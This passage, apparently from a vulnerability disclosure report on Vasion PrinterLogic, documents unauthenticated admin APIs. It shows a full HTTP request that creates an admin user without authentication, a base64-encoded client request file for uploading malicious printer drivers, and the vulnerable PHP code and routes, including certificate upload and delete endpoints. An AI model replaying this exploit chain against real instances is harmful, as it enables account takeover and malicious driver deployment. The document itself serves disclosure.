<p>Then the attacker sends a HTTP request to <code>/admin/idp-add-user</code> using the received <code>laravel_session</code> cookie in the HTTP header [1] and the received <code>_token</code> variable in the JSON payload [2]. We will add the <code>p[redacted]@[redacted]</code> account:</p>
<p>HTTP request to <code>/admin/idp-add-user</code>:
<img alt="" src="images/2025-vasion-report-2-add-admin-user-02.png" /></p>
<p><a href="images/2025-vasion-report-2-add-admin-user-02-full.png">Click here for full image</a></p>
<p>And the user has been correctly created without authentication to the [redacted].printercloud10.com instance:</p>
<p>Listing of users
<img alt="" src="images/2025-vasion-report-2-add-admin-user-03.png" /></p>
<p><a href="images/2025-vasion-report-2-add-admin-user-03-full.png">Click here for full image</a></p>
<p>Content of the HTTP request allowing creating any user.</p>
<p>HTTP request creating the <code>p[redacted]@[redacted]</code> user:</p>
<pre><code>POST /admin/idp-add-user HTTP/2
Host: [redacted].printercloud10.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 2347
Origin: https://[redacted].printercloud10.com
Referer: https://[redacted].printercloud10.com/admin/
Cookie: laravel_session=[redacted]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"_token":"hHfNlq9PkW2wKjU0S8yRrn2nvr8taEJiJ92giaJb","recordData":[{"id":"93a[redacted-custom-uuid]","firstName":"Pierre","lastName":"[redacted]","displayName":"","username":"p[redacted]","email":"p[redacted]","domain":"","siteId":"[target-instance-redacted]","distinguishedName":"","sourceId":"[redacted-obtained-from-public-apis]","sourceService":"[redacted-obtained-from-public-apis]","sourceServiceType":"custom","usnChange":"","groups":[],"userAttributes":[{"id":[redacted-obtained-from-public-apis],"user_id":"93a[redacted-custom-uuid]","attribute":"department","value":"[redacted-obtained-from-public-apis]","idp_id":"[redacted-obtained-from-public-apis]","tenant_id":[redacted-obtained-from-public-apis],"deletedAt":{"Time":"0001-01-01T00:00:00Z","Valid":false},"createdAt":"2023-10-18 06:41:41.000000","updatedAt":"2023-10-18 06:41:41.000000"},{"id":[redacted-obtained-from-public-apis],"user_id":"93a[redacted-custom-uuid]","attribute":"external-id","value":"[redacted-obtained-from-public-apis]","idp_id":"[redacted-obtained-from-public-apis]","tenant_id":9999,"deletedAt":{"Time":"0001-01-01T00:00:00Z","Valid":false},"createdAt":"2023-10-18 06:41:41.000000","updatedAt":"2023-10-18 06:41:41.000000"},{"id":[redacted-obtained-from-public-apis],"user_id":"93a[redacted-custom-uuid]","attribute":"active","value":true,"idp_id":"[redacted-obtained-from-public-apis]","tenant_id":9999,"deletedAt":{"Time":"0001-01-01T00:00:00Z","Valid":false},"createdAt":"2023-10-18 06:41:41.000000","updatedAt":"2023-10-18 06:41:41.000000"},{"id":[redacted-obtained-from-public-apis],"user_id":"93a[redacted-custom-uuid]","attribute":"identity-linking","value":"[redacted-custom-email]","idp_id":"[redacted-obtained-from-public-apis]","tenant_id":9999,"deletedAt":{"Time":"0001-01-01T00:00:00Z","Valid":false},"createdAt":"2023-10-18 06:41:41.000000","updatedAt":"2023-10-18 06:41:41.000000"},{"id":[redacted-obtained-from-public-apis],"user_id":"93a[redacted-custom-uuid]","attribute":"manager","value":"{\"value\":\"[redacted-obtained-from-public-apis]\",\"displayName\":\"\"}","idp_id":"[redacted-obtained-from-public-apis]","tenant_id":9999,"deletedAt":{"Time":"0001-01-01T00:00:00Z","Valid":false},"createdAt":"2023-10-18 06:41:45.000000","updatedAt":"2023-10-18 06:41:45.000000"}],"tenantId":9999,"createdAt":"2023-10-18 06:41:41.000000","updatedAt":"2023-10-18 06:41:41.000000","pinNumbers":[],"selected":true,"idpName":"SSO"}],"nodeId":"2","objType":"user"}
</code></pre>
<p>This working request was built based on the output of the <code>/api-gateway/identify/search-users</code> API. This API can list all the users with all the needed fields (id, firstname, lastname, displayname, username, email, domain, siteId, sourceId, sourceService, userAttributes [groups], ...):</p>
<p>Output of the <code>/api-gateway/identify/search-users</code> API:</p>
<p><img alt="" src="images/2025-vasion-report-2-add-admin-user-05.png" /></p>
<p>The vulnerable code is located in the <code>/var/www/app/app/Http/Controllers/IdpSearchController.php</code> file inside the <code>printercloud/pi</code> Docker instance. No authentication is required.</p>
<p>Content of <code>/var/www/app/app/Http/Controllers/IdpSearchController.php</code> inside the <code>printercloud/pi</code> Docker instance:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">284</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">addUser</span>(Request <span style="color: #19177C">$request</span>)
<span style="color: #666666">285</span>     {
<span style="color: #666666">286</span>         <span style="color: #19177C">$usersOrGroups</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">input</span>(self<span style="color: #666666">::</span><span style="color: #7D9029">DATA_NAME_REQUEST_PARAM</span>);
<span style="color: #666666">287</span>         <span style="color: #19177C">$objType</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">input</span>(self<span style="color: #666666">::</span><span style="color: #7D9029">OBJ_TYPE_REQUEST_PARAM</span>);
<span style="color: #666666">288</span>     
<span style="color: #666666">289</span>         <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> Collection();
<span style="color: #666666">290</span>         <span style="color: #008000; font-weight: bold">try</span> {
<span style="color: #666666">291</span>             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_null</span>(<span style="color: #19177C">$usersOrGroups</span>)) {
<span style="color: #666666">292</span>                 <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> NoRecordsException();
<span style="color: #666666">293</span>             }
<span style="color: #666666">294</span>             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_null</span>(<span style="color: #19177C">$objType</span>)) {
<span style="color: #666666">295</span>                 <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> InvalidObjectTypeException();
<span style="color: #666666">296</span>             }       
<span style="color: #666666">297</span>             <span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$usersOrGroups</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$obj</span>) {
<span style="color: #666666">298</span>                 <span style="color: #19177C">$umo</span> <span style="color: #666666">=</span> UsersMicroserviceObject<span style="color: #666666">::</span><span style="color: #7D9029">firstOrCreate</span>([
<span style="color: #666666">299</span>                     <span style="color: #BA2121">&#39;unique_identifier&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$obj</span>[<span style="color: #BA2121">&#39;id&#39;</span>],
<span style="color: #666666">300</span>                     <span style="color: #BA2121">&#39;object_type&#39;</span> <span style="color: #666666">=&gt;</span> self<span style="color: #666666">::</span><span style="color: #7D9029">getIntObjType</span>(<span style="color: #19177C">$objType</span>),
<span style="color: #666666">301</span>                 ]);
<span style="color: #666666">302</span>                 <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> User<span style="color: #666666">::</span><span style="color: #7D9029">firstOrCreate</span>(
<span style="color: #666666">303</span>                     [
<span style="color: #666666">304</span>                         <span style="color: #BA2121">&#39;umo_id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$umo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span>,
<span style="color: #666666">305</span>                     ],
<span style="color: #666666">306</span>                     [
<span style="color: #666666">307</span>                         <span style="color: #BA2121">&#39;username&#39;</span> <span style="color: #666666">=&gt;</span> self<span style="color: #666666">::</span><span style="color: #7D9029">getIntObjType</span>(<span style="color: #19177C">$objType</span>) <span style="color: #666666">==</span> self<span style="color: #666666">::</span><span style="color: #7D9029">USER_OBJECT_TYPE</span> <span style="color: #666666">?</span>
<span style="color: #666666">308</span>                             <span style="color: #19177C">$obj</span>[<span style="color: #BA2121">&#39;username&#39;</span>] <span style="color: #666666">:</span> <span style="color: #19177C">$obj</span>[<span style="color: #BA2121">&#39;name&#39;</span>],
<span style="color: #666666">309</span>                         <span style="color: #BA2121">&#39;email_address&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;!@#umo_&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$umo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span>,
<span style="color: #666666">310</span>                         <span style="color: #BA2121">&#39;user_status&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;Active&#39;</span>,
<span style="color: #666666">311</span>                         <span style="color: #BA2121">&#39;my_password&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;-&#39;</span>,
<span style="color: #666666">312</span>                         <span style="color: #BA2121">&#39;first_name&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;-&#39;</span>,
<span style="color: #666666">313</span>                         <span style="color: #BA2121">&#39;last_name&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;-&#39;</span>,
<span style="color: #666666">314</span>                         <span style="color: #BA2121">&#39;user_type&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #666666">3</span>,
<span style="color: #666666">315</span>                         <span style="color: #BA2121">&#39;account_id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #666666">1</span>,
<span style="color: #666666">316</span>                     ]
<span style="color: #666666">317</span>                 );
<span style="color: #666666">318</span>                 <span style="color: #19177C">$response</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">push</span>(<span style="color: #19177C">$user</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span>);
<span style="color: #666666">319</span>             }
<span style="color: #666666">320</span>         } <span style="color: #008000; font-weight: bold">catch</span> (NoRecordsException <span style="color: #19177C">$e</span>) {
<span style="color: #666666">321</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>(), <span style="color: #BA2121">&#39;INVALID-RECORDS&#39;</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_BAD_REQUEST</span>);
<span style="color: #666666">322</span>         } <span style="color: #008000; font-weight: bold">catch</span> (InvalidObjectTypeException <span style="color: #19177C">$e</span>) {
<span style="color: #666666">323</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>(), <span style="color: #BA2121">&#39;INVALID-OBJECT-TYPE&#39;</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_BAD_REQUEST</span>);
<span style="color: #666666">324</span>         } <span style="color: #008000; font-weight: bold">catch</span> (Exception <span style="color: #19177C">$e</span>) {
<span style="color: #666666">325</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>(), <span style="color: #008000; font-weight: bold">null</span>, <span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getCode</span>());
<span style="color: #666666">326</span>         }
<span style="color: #666666">327</span>     
<span style="color: #666666">328</span>         <span style="color: #008000; font-weight: bold">return</span> response(<span style="color: #19177C">$response</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_CREATED</span>);                                                                                                                                 
<span style="color: #666666">329</span>     }
</pre></div>

<p>This vulnerability has also been confirmed in the test SaaS version - the new user can log into the <code>/admin/</code> interface, and the session cookie has admin privileges even if the interface seems to be empty.</p>
<p>Login as p[redacted]@[redacted] inside the <code>/admin/</code> section
<img alt="" src="images/2025-vasion-report-2-add-admin-user-04.png" /></p>
<p><a href="images/2025-vasion-report-2-add-admin-user-04-full.png">Click here for full image</a></p>
<p>It is then possible to interact with APIs with admin privileges:</p>
<ul>
<li>Upload of new drivers</li>
<li>/api-gateway/certs/regenerateCA</li>
<li>/api-gateway/printers/mfg</li>
<li>/api-gateway/br/devices</li>
<li>[...]</li>
</ul>
<p>For example, we can upload drivers using the Linux client by creating a file named <code>1-1</code> inside the <code>/opt/PrinterInstallerClient/tmp/requests</code> directory containing these values.</p>
<p>Communicating with the Linux client to upload drivers:</p>
<pre><code>kali% cat test.file-upload
UPLOAD_DRIVER                                    # upload command
aHR0cHM6                                         # https
W3JlZGFjdGVkXS5wcmludGVyY2xvdWQxMC5jb20=         # [redacted].printercloud10.com
Lw==                                             # /
UEhQU0VTU0lEPTlscjEyYWFhYWJkNDcxMjhhZGIyODM0MDEy # PHPSESSID=9lr12aaaabd47128adb2834012
cHJpbnRlcg==                                     # printer
cDk3Mg==                                         # p972

LTE=                                             # -1
kali% cp test.file-upload /opt/PrinterInstallerClient/tmp/requests/1-1
</code></pre>
<p>The file contains the PHPSESSID cookie obtained previously when the newly created user logs in /admin/:</p>
<pre><code>kali% echo UEhQU0VTU0lEPTlscjEyYWFhYWJkNDcxMjhhZGIyODM0MDEy | base64 -d
PHPSESSID=9lr12aaaabd47128adb2834012
</code></pre>
<p>The Linux client will automatically create a popup asking to provide files for a printer driver:</p>
<p>Linux client</p>
<p><img alt="" src="images/2025-vasion-report-2-add-driver-01.png" /></p>
<p>Upload of drivers</p>
<p><img alt="" src="images/2025-vasion-report-2-add-driver-02.png" /></p>
<p>And when we visit the admin webpage, we can confirm that malicious drivers have been successfully uploaded:</p>
<p>Malicious drivers successfully uploaded in the admin interface</p>
<p><img alt="" src="images/2025-vasion-report-2-add-driver-03.png" /></p>
<p>An attacker can get admin privileges without authentication.</p>
<p>An attacker can get admin privileges and upload malicious drivers.</p>
<p><a id="va-insecure-apis-01"></a></p>
<h2>Details - Unauthenticated admin APIs allowing to configure the IdP (SSO) authentication mechanism</h2>
<p>It was observed that some admin APIs are reachable without authentication, including critical APIs allowing changing the IdP authentication mechanism (/admin/idp-deployments):</p>
<ul>
<li>/admin/authorized-devices</li>
<li>/admin/identity-management</li>
<li>/admin/user-management</li>
<li>/admin/idp-search</li>
<li>/admin/identity-idp-search</li>
<li>/admin/identity-add-user</li>
<li>/admin/idp-add-user</li>
<li>/admin/idp-deployments</li>
<li>/admin/idp-portal-securities</li>
<li>/admin/settings/logo</li>
</ul>
<p>These routes are defined in the <code>/var/www/app/routes/web.php</code> file located inside the <code>printercloud/pi</code> Docker instance.</p>
<p>Content of <code>/var/www/app/routes/web.php</code> inside the <code>printercloud/pi</code> Docker instance:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">185</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;authorized-devices&#39;</span>, [
<span style="color: #666666">186</span>         <span style="color: #BA2121">&#39;middleware&#39;</span> <span style="color: #666666">=&gt;</span> [<span style="color: #BA2121">&#39;web&#39;</span>],
<span style="color: #666666">187</span>         <span style="color: #BA2121">&#39;as&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;authorizedDevides.view&#39;</span>,
<span style="color: #666666">188</span>         <span style="color: #BA2121">&#39;uses&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;AuthorizedDeviceController@view&#39;</span>,
<span style="color: #666666">189</span>     ]); 
<span style="color: #666666">190</span>     
<span style="color: #666666">191</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;identity-management&#39;</span>, [
<span style="color: #666666">192</span>         <span style="color: #BA2121">&#39;middleware&#39;</span> <span style="color: #666666">=&gt;</span> [<span style="color: #BA2121">&#39;web&#39;</span>],
<span style="color: #666666">193</span>         <span style="color: #BA2121">&#39;as&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;identityManagement.view&#39;</span>,
<span style="color: #666666">194</span>         <span style="color: #BA2121">&#39;uses&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;IdentityManagementController@view&#39;</span>,
<span style="color: #666666">195</span>     ]);
<span style="color: #666666">196</span> 
<span style="color: #666666">197</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;user-management&#39;</span>, [
<span style="color: #666666">198</span>         <span style="color: #BA2121">&#39;middleware&#39;</span> <span style="color: #666666">=&gt;</span> [<span style="color: #BA2121">&#39;web&#39;</span>],
<span style="color: #666666">199</span>         <span style="color: #BA2121">&#39;as&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;userManagement.view&#39;</span>,
<span style="color: #666666">200</span>         <span style="color: #BA2121">&#39;uses&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;UserManagementController@view&#39;</span>,
<span style="color: #666666">201</span>     ]);
[<span style="color: #666666">...</span>]
</pre></div>

<p>For example, the /admin/idp-deployments API is implemented inside the <code>/var/www/app/Http/Controllers/IdpSearchController.php</code> file.</p>
<p>There is no authentication, and the attacker-controlled values are directly used to define the IdP deployment:</p>
<p>Content of <code>/var/www/app/Http/Controllers/IdpSearchController.php</code> inside the <code>printercloud/pi</code> Docker instance:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">174</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">setDeploymentDetails</span>(Request <span style="color: #19177C">$request</span>)
<span style="color: #666666">175</span>     {
<span style="color: #666666">176</span>         <span style="color: #19177C">$usersOrGroups</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">input</span>(self<span style="color: #666666">::</span><span style="color: #7D9029">DATA_NAME_REQUEST_PARAM</span>);
<span style="color: #666666">177</span>         <span style="color: #19177C">$nodeId</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">input</span>(self<span style="color: #666666">::</span><span style="color: #7D9029">NODE_ID_REQUEST_PARAM</span>);
<span style="color: #666666">178</span>         <span style="color: #19177C">$objType</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">input</span>(self<span style="color: #666666">::</span><span style="color: #7D9029">OBJ_TYPE_REQUEST_PARAM</span>);
<span style="color: #666666">179</span>         <span style="color: #008000; font-weight: bold">try</span> {
<span style="color: #666666">180</span>             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_null</span>(<span style="color: #19177C">$usersOrGroups</span>)) {
<span style="color: #666666">181</span>                 <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> NoRecordsException();
<span style="color: #666666">182</span>             }                     
<span style="color: #666666">183</span>             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_null</span>(<span style="color: #19177C">$nodeId</span>)) {
<span style="color: #666666">184</span>                 <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> NoNodeIdException();
<span style="color: #666666">185</span>             }                      
<span style="color: #666666">186</span>             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">is_null</span>(<span style="color: #19177C">$objType</span>)) {
<span style="color: #666666">187</span>                 <span style="color: #008000; font-weight: bold">throw</span> <span style="color: #008000; font-weight: bold">new</span> InvalidObjectTypeException();
<span style="color: #666666">188</span>             }
<span style="color: #666666">189</span> 
<span style="color: #666666">190</span>             <span style="color: #19177C">$audits</span> <span style="color: #666666">=</span> \App<span style="color: #666666">::</span><span style="color: #7D9029">make</span>(Audits<span style="color: #666666">::</span><span style="color: #7D9029">class</span>);
<span style="color: #666666">191</span>             <span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$usersOrGroups</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$obj</span>) {
<span style="color: #666666">192</span>                 <span style="color: #19177C">$umo</span> <span style="color: #666666">=</span> UsersMicroserviceObject<span style="color: #666666">::</span><span style="color: #7D9029">firstOrCreate</span>([
<span style="color: #666666">193</span>                     <span style="color: #BA2121">&#39;unique_identifier&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$obj</span>[<span style="color: #BA2121">&#39;id&#39;</span>],
<span style="color: #666666">194</span>                     <span style="color: #BA2121">&#39;object_type&#39;</span> <span style="color: #666666">=&gt;</span> self<span style="color: #666666">::</span><span style="color: #7D9029">getIntObjType</span>(<span style="color: #19177C">$objType</span>),
<span style="color: #666666">195</span>                 ]);
<span style="color: #666666">196</span>                 TreeAssociations<span style="color: #666666">::</span><span style="color: #7D9029">firstOrCreate</span>([
<span style="color: #666666">197</span>                     <span style="color: #BA2121">&#39;node_id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$nodeId</span>,
<span style="color: #666666">198</span>                     <span style="color: #BA2121">&#39;associated_type&#39;</span> <span style="color: #666666">=&gt;</span> self<span style="color: #666666">::</span><span style="color: #7D9029">USER_MICROSERVICE_OBJECT_ASSOCIATION_TYPE</span>,
<span style="color: #666666">199</span>                     <span style="color: #BA2121">&#39;associated_id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$umo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span>,
<span style="color: #666666">200</span>                 ]);
<span style="color: #666666">201</span>                 <span style="color: #19177C">$audits</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">audit</span>(
<span style="color: #666666">202</span>                     <span style="color: #666666">2300</span>,
<span style="color: #666666">203</span>                     <span style="color: #BA2121">&#39;&#39;</span>,
<span style="color: #666666">204</span>                     <span style="color: #BA2121">&#39;IdP Deployment&#39;</span>,
<span style="color: #666666">205</span>                     <span style="color: #19177C">$obj</span>[<span style="color: #BA2121">&#39;id&#39;</span>],
<span style="color: #666666">206</span>                     AuditConstants<span style="color: #666666">::</span><span style="color: #7D9029">AC_CREATE</span>,
<span style="color: #666666">207</span>                     <span style="color: #BA2121">&#39;Deployment&#39;</span>,
<span style="color: #666666">208</span>                     <span style="color: #BA2121">&#39;&#39;</span>,
<span style="color: #666666">209</span>                     <span style="color: #BA2121">&#39;&#39;</span>,
<span style="color: #666666">210</span>                     AuditConstants<span style="color: #666666">::</span><span style="color: #7D9029">AT_IDP_USER</span>,
<span style="color: #666666">211</span>                     <span style="color: #BA2121">&#39;&#39;</span>,
<span style="color: #666666">212</span>                     <span style="color: #BA2121">&#39;&#39;</span>,
<span style="color: #666666">213</span>                     <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">214</span>                 );
<span style="color: #666666">215</span>             }
<span style="color: #666666">216</span>         } <span style="color: #008000; font-weight: bold">catch</span> (NoRecordsException <span style="color: #19177C">$e</span>) {
<span style="color: #666666">217</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>(), <span style="color: #BA2121">&#39;INVALID-RECORDS&#39;</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_BAD_REQUEST</span>);
<span style="color: #666666">218</span>         } <span style="color: #008000; font-weight: bold">catch</span> (NoNodeIdException <span style="color: #19177C">$e</span>) {
<span style="color: #666666">219</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>(), <span style="color: #BA2121">&#39;INVALID-NODE-ID&#39;</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_BAD_REQUEST</span>);
<span style="color: #666666">220</span>         } <span style="color: #008000; font-weight: bold">catch</span> (InvalidObjectTypeException <span style="color: #19177C">$e</span>) {
<span style="color: #666666">221</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>(), <span style="color: #BA2121">&#39;INVALID-OBJECT-TYPE&#39;</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_BAD_REQUEST</span>);
<span style="color: #666666">222</span>         } <span style="color: #008000; font-weight: bold">catch</span> (Exception <span style="color: #19177C">$e</span>) {
<span style="color: #666666">223</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>(), <span style="color: #008000; font-weight: bold">null</span>, <span style="color: #19177C">$e</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getCode</span>());
<span style="color: #666666">224</span>         }                                                                                                                                                                                       
<span style="color: #666666">225</span>         <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>([<span style="color: #BA2121">&#39;message&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;created&#39;</span>], HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_CREATED</span>);                                                                                                          
<span style="color: #666666">226</span>     }
[<span style="color: #666666">...</span>]
</pre></div>

<p>An attacker can control the authentication mechanism and compromise PrinterLogic VA/SaaS.</p>
<p><a id="va-insecure-apis-02"></a></p>
<h2>Details - Unauthenticated admin APIs allowing to upload/download SSL certificates</h2>
<p>It was observed that some admin APIs are reachable without authentication, including APIs allowing to upload, generate and delete certificates:</p>
<ul>
<li>/admin/hp/cert_upload</li>
<li>/admin/hp/cert_delete</li>
<li>/admin/certs/ca</li>
<li>/admin/certs/serviceclients/{scid}</li>
</ul>
<p>These routes are defined in the <code>/var/www/app/routes/web.php</code> file located inside the <code>printercloud/pi</code> Docker instance:</p>
<p>Content of <code>/var/www/app/routes/web.php</code> inside the <code>printercloud/pi</code> Docker instance:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">103</span>     <span style="color: #408080; font-style: italic">/*   </span>
<span style="color: #408080; font-style: italic">104      * Certificate file upload Route</span>
<span style="color: #408080; font-style: italic">105      */</span>   
<span style="color: #666666">106</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">post</span>(<span style="color: #BA2121">&#39;/hp/cert_upload&#39;</span>, [
<span style="color: #666666">107</span>         <span style="color: #BA2121">&#39;as&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;hp.cert-upload&#39;</span>,
<span style="color: #666666">108</span>         <span style="color: #BA2121">&#39;uses&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;HPCertificateController@uploadCertificate&#39;</span>
<span style="color: #666666">109</span>     ]);  
<span style="color: #666666">110</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">post</span>(<span style="color: #BA2121">&#39;/hp/cert_delete&#39;</span>, [
<span style="color: #666666">111</span>         <span style="color: #BA2121">&#39;as&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;hp.cert-delete&#39;</span>,
<span style="color: #666666">112</span>         <span style="color: #BA2121">&#39;uses&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;HPCertificateController@deleteCertificate&#39;</span>
<span style="color: #666666">113</span>     ]);  
<span style="color: #666666">114</span> 
<span style="color: #666666">115</span>     <span style="color: #BA2121; font-style: italic">/**  </span>
<span style="color: #BA2121; font-style: italic">116      * Certificate download routes</span>
<span style="color: #BA2121; font-style: italic">117      */</span>   
<span style="color: #666666">118</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;/certs/ca&#39;</span>, [
<span style="color: #666666">119</span>         <span style="color: #BA2121">&#39;as&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;cert.ca&#39;</span>,
<span style="color: #666666">120</span>         <span style="color: #BA2121">&#39;uses&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;CertificateController@downloadCACertificate&#39;</span>     
<span style="color: #666666">121</span>     ]);  
<span style="color: #666666">122</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;/certs/serviceclients/{scid}&#39;</span>, [
<span style="color: #666666">123</span>         <span style="color: #BA2121">&#39;as&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;certs.servicelcients-scid&#39;</span>,
